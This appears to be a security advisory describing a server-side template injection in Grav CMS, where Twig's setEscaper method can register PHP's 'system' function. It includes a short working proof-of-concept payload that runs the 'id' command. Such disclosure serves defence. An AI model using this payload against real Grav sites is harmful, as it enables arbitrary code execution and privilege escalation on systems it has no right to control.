summary: "Server Side Template Injection (SSTI) via Twig escape handler\n### Summary\nDue to\
  \ the unrestricted access to twig extension class from grav context, an attacker can redefine\
  \ the escape function and execute arbitrary commands.\n\n### Details\nhttps://github.com/twigphp/Twig/blob/3.x/src/Extension/EscaperExtension.php#L99\n\
  ```php\n/**\n     * Defines a new escaper to be used via the escape filter.\n     *\n    \
  \ * @param string   $strategy The strategy name that should be used as a strategy in the escape\
  \ call\n     * @param callable $callable A valid PHP callable\n     */\n    public function\
  \ setEscaper($strategy, callable $callable)\n    {\n        $this->escapers[$strategy] = $callable;\n\
  \    }\n ```\n Twig supports the functionality to redefine the escape function through the\
  \ setEscaper method. \nHowever, that method is not originally exposed to the twig environment,\
  \ but it is accessible through the payload below.\n\n```plaintext\n{{ grav.twig.twig.extensions.core.setEscaper('a','a')\
  \ }}\n```\nAt this point, it accepts callable type as an argument, but as there is no validation\
  \ for the $callable variable, attackers can set dangerous functions like system as the escaper\
  \ function.\n\n\n### PoC\n```\n{{ var_dump(grav.twig.twig.extensions.core.setEscaper('system','twig_array_filter'))\
  \ }}\n{{ var_dump(['id'] | escape('system', 'system')) }}\n```\n\n### Impact\nTwig processing\
  \ of static pages can be enabled in the front matter by any administrative user allowed to\
  \ create or edit pages.\nAs the Twig processor runs unsandboxed, this behavior can be used\
  \ to gain arbitrary code execution and elevate privileges on the instance."
